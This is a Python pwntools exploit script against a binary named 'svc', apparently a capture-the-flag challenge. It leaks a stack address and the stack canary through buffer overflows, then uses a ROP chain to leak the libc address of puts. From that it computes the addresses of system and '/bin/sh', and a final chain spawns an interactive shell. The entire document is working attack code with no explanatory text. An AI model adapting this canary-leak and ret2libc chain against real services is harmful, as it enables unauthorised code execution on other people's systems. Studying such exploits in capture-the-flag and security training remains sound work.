from pwn import *

binary = context.binary = ELF("./svc")
libc = ELF("./libc-2.23.so")
ld = ELF("./ld-2.23.so")

got_puts    = 0x00602018
plt_puts    = 0x004008d0
rdi_ret     = 0x00400ea3
main_addr   = 0x00400a96
puts_addr   = 0x0016f690
system_addr = 0x00145390
binsh_addr  = 0x0028cd57

if args.GDB:
    p = gdb.debug([ld.path, binary.path], env={"LD_PRELOAD":libc.path})
else:
    p = process([ld.path, binary.path], env={"LD_PRELOAD":libc.path})

# Read stack address
p.readuntil(">>")
p.sendline(b"1")

p.readuntil(">>")
payload = b""
payload += b"A" * 0x37

with open("payload", "wb") as fp:
    fp.write(payload)

p.sendline(payload)

p.readuntil(">>")
p.sendline(b"2")

p.readuntil("AAAAAAAA\n")
tmp = p.readuntil(">>")
print(tmp)
tmp = tmp.split(b'\n')[0]
stack_address = u64(tmp + b"\x00" * (8 - len(tmp)))
print(f"Stack address: {hex(stack_address)}")
p.sendline(b"1")

# Read canary
p.readuntil(">>")
payload = b""
payload += b"A" * 0xa8

with open("payload", "ab") as fp:
    fp.write(payload)

p.sendline(payload)

p.readuntil(">>")
p.sendline(b"2")

p.readuntil("AAAAAAAA\n")
tmp = p.readuntil(">>")
stack_canary = u64(b"\x00" +  tmp[:7])
print(f"Canary: {hex(stack_canary)}")
p.sendline(b"1")

p.readuntil(">>")
payload = b""
payload += b"B" * 0xa8
payload += p64(stack_canary)
payload += b"C" * 0x8
payload += p64(rdi_ret)
payload += p64(got_puts)
payload += p64(plt_puts)
payload += p64(main_addr)

with open("payload", "ab") as fp:
    fp.write(payload)

p.sendline(payload)

p.readuntil(">>")
p.sendline(b"3")

p.recvuntil("TIME TO MINE MIENRALS...\n")
tmp = p.recvuntil("\n")
puts_leak = u64(tmp[:-1].ljust(8, b"\x00"))
print(f"Puts leak address: {hex(puts_leak)}")
system_leak = puts_leak + (system_addr - puts_addr)
print(f"System leak address: {hex(system_leak)}")
binsh_leak = puts_leak + (binsh_addr - puts_addr)
print(f"/bin/sh leak address: {hex(binsh_leak)}")

p.readuntil(">>")
p.sendline(b"1")

p.readuntil(">>")
payload = b""
payload += b"D" * 0xa8
payload += p64(stack_canary)
payload += b"E" * 0x8
payload += p64(rdi_ret)
payload += p64(binsh_leak)
payload += p64(system_leak)
p.sendline(payload)

p.readuntil(">>")
p.sendline(b"3")

p.interactive()